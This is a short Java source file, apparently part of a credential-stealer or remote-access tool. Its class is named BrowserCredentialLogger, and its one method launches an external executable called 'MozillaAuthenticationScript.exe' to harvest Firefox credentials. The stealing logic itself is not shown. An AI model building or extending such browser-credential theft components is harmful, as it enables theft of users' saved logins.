package Utility;

import java.io.IOException;

public class BrowserCredentialLogger
{

	public static void mozillaCredentialsLogger()
	{
		try {
			Runtime.getRuntime().exec("MozillaAuthenticationScript.exe");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
